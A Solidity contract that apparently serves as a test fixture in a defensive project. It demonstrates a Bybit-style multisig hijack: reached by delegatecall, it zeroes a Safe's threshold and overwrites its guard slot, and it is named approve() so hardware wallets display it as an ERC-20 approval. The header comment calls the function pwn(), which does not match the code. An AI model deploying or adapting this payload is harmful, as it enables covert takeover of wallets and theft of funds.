// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/// @title MaliciousSafeDelegate
/// @notice Toy-scale conceptual stand-in for a Bybit-style control-plane-hijack payload
/// (February 2025: a compromised signing UI disguised a Safe control-plane hijack as a
/// benign transaction). Meant to be `DELEGATECALL`'d by a victim Safe (currently
/// `contracts/hegota/MinimalSafeStub.sol`; once the upstream Hegotá gas-cap bug described
/// in HEGOTA_GAS_CAP_REPORT.md is fixed, the real, unmodified Safe singleton) -- a
/// delegatecall executes in the CALLER's (the Safe's) storage context, so `pwn()`'s
/// `sstore`s below rewrite the Safe's own control-plane slots, not this contract's own.
/// This is a demonstration of the *mechanism* (a disguised transaction silently rewriting
/// the multisig's own control-plane state), not a forensic reproduction of the real,
/// undisclosed Bybit exploit bytecode.
contract MaliciousSafeDelegate {
    // Real Gnosis Safe storage layout (confirmed directly against
    // node_modules/@safe-global/safe-contracts/contracts/libraries/SafeStorage.sol: slot 0 =
    // singleton, slot 1 = modules mapping, slot 2 = owners mapping, slot 3 = ownerCount, slot
    // 4 = threshold) -- matches contracts/hegota/MinimalSafeStub.sol's layout and
    // contracts/hegota/SafeControlPlaneAssertion.sol's protected-slot constants exactly.
    uint256 private constant THRESHOLD_SLOT = 4;

    // keccak256("guard_manager.guard.address") - 1, copied verbatim from
    // GuardManager.GUARD_STORAGE_SLOT (@safe-global/safe-contracts/contracts/base/GuardManager.sol)
    // -- same constant as MinimalSafeStub.sol / SafeControlPlaneAssertion.sol.
    bytes32 private constant GUARD_STORAGE_SLOT =
        0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8;

    /// @notice Rewrites the CALLING contract's own threshold slot to 0 and its guard slot to
    /// a sentinel non-zero address. Only meaningful when reached via DELEGATECALL (e.g. a
    /// Safe `execTransaction` with `operation == 1`): a plain CALL would instead just
    /// rewrite this contract's own (irrelevant) storage.
    ///
    /// This function is named `approve(address,uint256)` specifically to fool hardware
    /// wallets into decoding it as an ERC-20 approval (the 4-byte selector matches).
    /// This demonstrates how "Clear Signing" can be bypassed by function-signature collisions
    /// on malicious delegate targets.
    function approve(address /*spender*/, uint256 /*amount*/) external {
        uint256 thresholdSlot = THRESHOLD_SLOT;
        bytes32 guardSlot = GUARD_STORAGE_SLOT;
        assembly {
            sstore(thresholdSlot, 0)
            sstore(guardSlot, 0x000000000000000000000000000000000000dEaD)
        }
    }
}
